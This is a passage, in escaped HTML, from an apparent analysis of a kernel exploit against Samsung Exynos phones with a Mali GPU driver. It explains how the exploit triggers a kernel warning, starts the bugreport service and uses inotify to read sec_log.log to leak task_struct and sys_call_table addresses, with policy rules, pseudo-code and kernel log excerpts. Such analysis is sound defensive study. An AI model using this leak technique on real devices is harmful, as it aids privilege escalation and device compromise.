ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow system_server ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow vold ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow vold ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow wlandutservice ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow wlandutservice ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The bugreport service is defined in &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/system/etc/init/dumpstate.rc&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.a28f679f59f4b6f4de860e93ae1130f9799f221a\"&gt;&lt;/a&gt;&lt;a id=\"t.11\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;service bugreport &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;system&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;bin&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;dumpstate &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;d &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;p &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;B &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;z &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;\\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;o &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;user_de&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;com&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;android&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;shell&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;files&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;bugreports&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;bugreport&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;class&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;nbsp;main&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;nbsp; &amp;nbsp; disabled&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; oneshot&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;bugreport&lt;/span&gt;&lt;span&gt;&amp;nbsp;service in &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dumpstate.rc&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a Samsung-specific customization. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://cs.android.com/android/platform/superproject/+/master:frameworks/native/cmds/dumpstate/dumpstate.rc;l=1?q=dumpstate.rc&amp;sq=&amp;ss=android%2Fplatform%2Fsuperproject\"&gt;AOSP version of &lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2 vdnyYxSRCi-c27\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://cs.android.com/android/platform/superproject/+/master:frameworks/native/cmds/dumpstate/dumpstate.rc;l=1?q=dumpstate.rc&amp;sq=&amp;ss=android%2Fplatform%2Fsuperproject\"&gt;dumpstate.rc&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;doesn&amp;rsquo;t include this service.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The Samsung version of the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dumpstate&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/system/bin/dumpstate&lt;/span&gt;&lt;span&gt;) binary then copies everything from &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/proc/sec_log&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/data/log/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sec_log&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;.log&lt;/span&gt;&lt;span&gt;&amp;nbsp;as shown in the pseudo-code below. This is the first few lines of the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dumpstate()&lt;/span&gt;&lt;span&gt;&amp;nbsp;function within the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dumpstate&lt;/span&gt;&lt;span&gt;&amp;nbsp;binary. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dump_sec_log&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;(symbols included within the binary) function copies everything from the path provided in argument two to the path provided in argument three.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.d1bbc0067f19bca88f96968d3c911e88cda5b376\"&gt;&lt;/a&gt;&lt;a id=\"t.12\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; _ReadStatusReg&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ARM64_SYSREG&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;3&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;3&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;13&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;2&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; LOBYTE&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;s&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;18&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; v650&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;]&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0LL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; s_8 &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;17664LL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;char&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;**)((&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;char&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;s &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;+&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;char&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;**)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;DUMPSTATE&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;DurationReporter&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;::&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;DurationReporter&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;v636&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;__int64&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;s&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;((&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;__int8&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;s &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;!=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;operator&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;delete&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;v650&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;]);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp; dump_sec_log&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18 vdnyYxSRCi-c9\"&gt;&amp;quot;SEC LOG&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18 vdnyYxSRCi-c9\"&gt;&amp;quot;/proc/sec_log&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18 vdnyYxSRCi-c9\"&gt;&amp;quot;/data/log/sec_log.log&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;After starting the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;bugreport&lt;/span&gt;&lt;span&gt;&amp;nbsp;service, the exploit uses &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://man7.org/linux/man-pages/man7/inotify.7.html\"&gt;inotify&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to monitor for &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;IN_CLOSE_WRITE&lt;/span&gt;&lt;span&gt;&amp;nbsp;events in the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/data/log/&lt;/span&gt;&lt;span&gt;&amp;nbsp;directory. &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;IN_CLOSE_WRITE&lt;/span&gt;&lt;span&gt;&amp;nbsp;triggers when a file that was opened for writing is closed. So this watch will occur when &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dumpstate&lt;/span&gt;&lt;span&gt;&amp;nbsp;is finished writing to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sec_log.log&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;An example of the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sec_log.log&lt;/span&gt;&lt;span&gt;&amp;nbsp;file contents generated after hitting the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;WARN_ON&lt;/span&gt;&lt;span&gt;&amp;nbsp;statement is shown below. The exploit combs through the file contents looking for two values on the stack that are at address &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;*b60&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;*bc0&lt;/span&gt;&lt;span&gt;: the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;task_struct&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sys_call_table&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;address.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b661857298a41a556dd5123b1b902d7684a5d3bb\"&gt;&lt;/a&gt;&lt;a id=\"t.13\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c47\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c48\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635627] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] ------------[ cut here ]------------&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635654] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] WARNING: CPU: 4 PID: 25943 at drivers/gpu/arm/b_r19p0/mali_kbase_vinstr.c:992 kbasep_vinstr_hwcnt_reader_ioctl+0x36c/0x664&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635663] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] Modules linked in:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635675] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] CPU: 4 PID: 25943 Comm: poc Tainted: G &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;W &amp;nbsp; &amp;nbsp; &amp;nbsp; 4.14.113-20034833 #1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635682] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] Hardware name: Samsung BEYOND1LTE EUR OPEN 26 board based on EXYNOS9820 (DT)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635689] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] Call trace:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635701] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] [&amp;lt;0000000000000000&amp;gt;] dump_backtrace+0x0/0x280&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635710] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] [&amp;lt;0000000000000000&amp;gt;] show_stack+0x18/0x24&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635720] &amp;nbsp;[4: 